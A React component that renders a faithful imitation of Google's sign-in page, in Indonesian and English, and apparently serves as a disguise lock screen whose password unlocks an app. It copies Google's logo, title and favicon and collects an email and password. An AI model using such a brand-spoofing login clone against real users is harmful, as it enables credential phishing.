'use client';

import React, { useState, useEffect } from 'react';
import { motion, AnimatePresence } from 'framer-motion';

interface PenyamaranGmailProps {
    onUnlock: (password: string) => void;
    isLoading: boolean;
    error: string | boolean;
}

type Bahasa = 'id' | 'en';

const TEKS = {
    id: {
        judul: 'Login',
        sambut: 'Selamat datang',
        subJudul: 'Gunakan Akun Google Anda',
        labelEmail: 'Email atau ponsel',
        labelSandi: 'Masukkan sandi Anda',
        lupaEmail: 'Lupa email?',
        lupaSandi: 'Lupa sandi?',
        tamu: 'Bukan komputer Anda? Gunakan jendela Tamu untuk login secara pribadi.',
        pelajari: 'Pelajari lebih lanjut',
        buatAkun: 'Buat akun',
        kembali: 'Kembali',
        berikutnya: 'Berikutnya',
        errorSandi: 'Sandi salah. Coba lagi atau klik \'Lupa sandi\' untuk meresetnya.',
        errorEmail: 'Masukkan email atau nomor ponsel yang valid.',
        bantuan: 'Bantuan',
        privasi: 'Privasi',
        persyaratan: 'Persyaratan'
    },
    en: {
        judul: 'Sign in',
        sambut: 'Welcome',
        subJudul: 'Use your Google Account',
        labelEmail: 'Email or phone',
        labelSandi: 'Enter your password',
        lupaEmail: 'Forgot email?',
        lupaSandi: 'Forgot password?',
        tamu: 'Not your computer? Use Guest mode to sign in privately.',
        pelajari: 'Learn more',
        buatAkun: 'Create account',
        kembali: 'Back',
        berikutnya: 'Next',
        errorSandi: 'Wrong password. Try again or click Forgot password to reset it.',
        errorEmail: 'Enter a valid email or phone number.',
        bantuan: 'Help',
        privasi: 'Privacy',
        persyaratan: 'Terms'
    }
};

export const PenyamaranGmail = ({ onUnlock, isLoading, error }: PenyamaranGmailProps) => {
    const [bahasa, setBahasa] = useState<Bahasa>('id');
    const [email, setEmail] = useState('');
    const [showPassword, setShowPassword] = useState(false);
    const [password, setPassword] = useState('');
    const [emailError, setEmailError] = useState(false);

    const t = TEKS[bahasa];

    useEffect(() => {
        const originalTitle = document.title;
        const originalFavicon = document.querySelector('link[rel="icon"]')?.getAttribute('href');

        document.title = bahasa === 'id' ? 'Login - Akun Google' : 'Sign in - Google Accounts';

        const link: HTMLLinkElement = document.querySelector('link[rel="icon"]') || document.createElement('link');
        link.rel = 'icon';
        link.href = 'https://www.google.com/favicon.ico';
        if (!document.head.contains(link)) document.head.appendChild(link);

        return () => {
            document.title = originalTitle;
            if (originalFavicon) {
                link.href = originalFavicon;
            }
        };
    }, [bahasa]);

    const handleNext = (e: React.FormEvent) => {
        e.preventDefault();
        if (!showPassword) {
            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
            const phoneRegex = /^\+?[0-9]{10,15}$/;
            if (emailRegex.test(email) || phoneRegex.test(email)) {
                setEmailError(false);
                setShowPassword(true);
            } else {
                setEmailError(true);
            }
        } else if (password) {
            onUnlock(password);
        }
    };

    return (
        <div className="fixed inset-0 z-[110] bg-[#f0f2f1] flex flex-col items-center justify-center p-4 font-sans select-none">
            <motion.div
                initial={{ opacity: 0, y: 20 }}
                animate={{ opacity: 1, y: 0 }}
                className="w-full max-w-[448px] bg-white border border-[#dadce0] rounded-lg p-6 sm:p-12 flex flex-col items-center shadow-none min-h-[500px]"
            >
                {/* Google Logo */}
                <div className="mb-3">
                    <svg viewBox="0 0 75 24" width="75" height="24">
                        <path fill="#4285F4" d="M9.24 11.44v2.46h5.86c-.24 1.35-1.57 3.96-5.86 3.96-3.7 0-6.72-3.07-6.72-6.86s3.02-6.86 6.72-6.86c2.1 0 3.51.87 4.31 1.64l1.94-1.87C14.25 2.68 12.01 1.5 9.24 1.5 4.14 1.5 0 5.64 0 10.74s4.14 9.24 9.24 9.24c5.33 0 8.87-3.75 8.87-9.03 0-.61-.07-1.07-.15-1.51H9.24z"/>
                        <path fill="#EA4335" d="M22.09 10.74c0 3.12 2.05 5.56 5.14 5.56 3.09 0 5.14-2.44 5.14-5.56s-2.05-5.56-5.14-5.56c-3.09 0-5.14 2.44-5.14 5.56zm7.84 0c0 1.95-1.15 3.32-2.7 3.32-1.55 0-2.7-1.37-2.7-3.32 0-1.97 1.15-3.32 2.7-3.32 1.55 0 2.7 1.35 2.7 3.32z"/>
                        <path fill="#FBBC05" d="M33.61 10.74c0 3.12 2.05 5.56 5.14 5.56 3.09 0 5.14-2.44 5.14-5.56s-2.05-5.56-5.14-5.56c-3.09 0-5.14 2.44-5.14 5.56zm7.84 0c0 1.95-1.15 3.32-2.7 3.32-1.55 0-2.7-1.37-2.7-3.32 0-1.97 1.15-3.32 2.7-3.32 1.55 0 2.7 1.35 2.7 3.32z"/>
                        <path fill="#4285F4" d="M45.13 10.74c0 3.12 2.05 5.56 5.14 5.56 1.39 0 2.44-.54 3.05-1.2h.07v1c0 2.12-1.13 3.26-2.96 3.26-1.51 0-2.46-1.09-2.8-1.99l-2.18.91c.63 1.51 2.29 3.32 4.98 3.32 2.88 0 5.33-1.7 5.33-5.58V5.34h-2.39v.93h-.07c-.61-.71-1.66-1.32-3.05-1.32-3.09 0-5.12 2.46-5.12 5.79zm7.84 0c0 1.95-1.15 3.32-2.7 3.32-1.55 0-2.7-1.37-2.7-3.32 0-1.97 1.15-3.32 2.7-3.32 1.55 0 2.7 1.35 2.7 3.32z"/>
                        <path fill="#34A853" d="M57.44 1.83v17.82h2.5V1.83h-2.5z"/>
                        <path fill="#EA4335" d="M68.53 14.06c-1.39 0-2.37-.63-2.96-1.84l7.98-3.3-.27-.68c-.51-1.35-2.03-3.06-4.52-3.06-2.48 0-4.56 1.96-4.56 5.56 0 3.06 2.05 5.56 5.14 5.56 2.48 0 3.91-1.51 4.51-2.39l-1.84-1.23c-.6.89-1.42 1.38-2.48 1.38zm-.12-6.52c1.07 0 1.98.54 2.27 1.28L63.5 11.75c0-2.26 1.63-4.21 4.91-4.21z"/>
                    </svg>
                </div>

                <h1 className="text-2xl font-normal text-[#202124] mb-2 text-center">
                    {showPassword ? t.sambut : t.judul}
                </h1>

                <div
                    className={`flex items-center gap-2 px-3 py-1 rounded-full border border-[#dadce0] mb-8 cursor-pointer hover:bg-gray-50 transition-colors ${!showPassword && 'border-none hover:bg-transparent cursor-default'}`}
                    onClick={() => showPassword && setShowPassword(false)}
                >
                    {showPassword && (
                        <svg viewBox="0 0 24 24" width="20" height="20" className="text-[#5f6368]">
                            <path fill="currentColor" d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z"/>
                        </svg>
                    )}
                    <p className={`text-base text-[#202124] font-medium ${!showPassword && 'font-normal mb-2'}`}>
                        {showPassword ? email : t.subJudul}
                    </p>
                    {showPassword && (
                        <svg viewBox="0 0 24 24" width="16" height="16" className="text-[#5f6368]">
                            <path fill="currentColor" d="M7 10l5 5 5-5H7z"/>
                        </svg>
                    )}
                </div>

                <form onSubmit={handleNext} className="w-full flex flex-col flex-1">
                    <div className="relative mb-2">
                        <AnimatePresence mode="wait">
                            {!showPassword ? (
                                <motion.div
                                    key="email-input"
                                    initial={{ opacity: 0, x: -20 }}
                                    animate={{ opacity: 1, x: 0 }}
                                    exit={{ opacity: 0, x: 20 }}
                                    transition={{ duration: 0.2 }}
                                >
                                    <input
                                        type="text"
                                        value={email}
                                        onChange={(e) => { setEmail(e.target.value); setEmailError(false); }}
                                        placeholder={t.labelEmail}
                                        className={`w-full px-4 py-[13px] border ${emailError ? 'border-[#d93025] focus:ring-0 focus:border-[#d93025]' : 'border-[#dadce0] focus:ring-2 focus:ring-[#1a73e8] focus:border-transparent'} rounded-[4px] outline-none text-base text-black transition-all placeholder:text-gray-500`}
                                        autoFocus
                                    />
                                    {emailError && (
                                        <div className="flex items-center gap-2 mt-2 text-[#d93025] text-xs">
                                            <svg viewBox="0 0 24 24" width="16" height="16">
                                                <path fill="currentColor" d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
                                            </svg>
                                            {t.errorEmail}
                                        </div>
                                    )}
                                </motion.div>
                            ) : (
                                <motion.div
                                    key="password-input"
                                    initial={{ opacity: 0, x: 20 }}
                                    animate={{ opacity: 1, x: 0 }}
                                    exit={{ opacity: 0, x: -20 }}
                                    transition={{ duration: 0.2 }}
                                >
                                    <input
                                        type="password"
                                        value={password}
                                        onChange={(e) => setPassword(e.target.value)}
                                        placeholder={t.labelSandi}
                                        className={`w-full px-4 py-[13px] border ${error ? 'border-[#d93025] focus:ring-0 focus:border-[#d93025]' : 'border-[#dadce0] focus:ring-2 focus:ring-[#1a73e8] focus:border-transparent'} rounded-[4px] outline-none text-base text-black transition-all placeholder:text-gray-500`}
                                        autoFocus
                                    />
                                    {error && (
                                        <div className="flex items-center gap-2 mt-2 text-[#d93025] text-xs">
                                            <svg viewBox="0 0 24 24" width="16" height="16">
                                                <path fill="currentColor" d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
                                            </svg>
                                            {t.errorSandi}
                                        </div>
                                    )}
                                </motion.div>
                            )}
                        </AnimatePresence>
                    </div>

                    <button type="button" className="text-[#1a73e8] font-semibold text-[14px] mt-2 mb-8 hover:text-[#174ea6] transition-colors w-fit">
                        {showPassword ? t.lupaSandi : t.lupaEmail}
                    </button>

                    <div className="text-[14px] text-[#3c4043] mb-10 leading-relaxed">
                        {t.tamu}{' '}
                        <a href="https://support.google.com/chrome/answer/6130773" target="_blank" rel="noopener noreferrer" className="text-[#1a73e8] font-semibold hover:text-[#174ea6]">{t.pelajari}</a>
                    </div>

                    <div className="flex justify-between items-center mt-auto">
                        <button
                            type="button"
                            onClick={() => showPassword ? setShowPassword(false) : null}
                            className="text-[#1a73e8] font-semibold text-[14px] hover:bg-[#f8f9fa] px-3 py-2 rounded transition-colors active:bg-[#e8f0fe]"
                        >
                            {showPassword ? t.kembali : t.buatAkun}
                        </button>
                        <button
                            type="submit"
                            disabled={isLoading}
                            className="bg-[#1a73e8] hover:bg-[#1b66c9] text-white font-semibold px-6 py-2 rounded-[4px] transition-all disabled:opacity-50 text-[14px] shadow-sm active:shadow-none active:bg-[#174ea6]"
                        >
                            {t.berikutnya}
                        </button>
                    </div>
                </form>
            </motion.div>

            <div className="w-full max-w-[448px] mt-6 flex justify-between text-[12px] text-[#70757a] px-0">
                <div className="relative">
                    <select
                        value={bahasa}
                        onChange={(e) => setBahasa(e.target.value as Bahasa)}
                        className="bg-transparent outline-none cursor-pointer hover:bg-[#f1f3f4] px-2 py-1 rounded transition-colors"
                    >
                        <option value="id">Indonesia</option>
                        <option value="en">English (United States)</option>
                    </select>
                </div>
                <div className="flex gap-4">
                    <a href="https://support.google.com/accounts?hl=id" target="_blank" rel="noopener noreferrer" className="hover:bg-[#f1f3f4] px-2 py-1 rounded transition-colors">{t.bantuan}</a>
                    <a href="https://policies.google.com/privacy?hl=id" target="_blank" rel="noopener noreferrer" className="hover:bg-[#f1f3f4] px-2 py-1 rounded transition-colors">{t.privasi}</a>
                    <a href="https://policies.google.com/terms?hl=id" target="_blank" rel="noopener noreferrer" className="hover:bg-[#f1f3f4] px-2 py-1 rounded transition-colors">{t.persyaratan}</a>
                </div>
            </div>
        </div>
    );
};
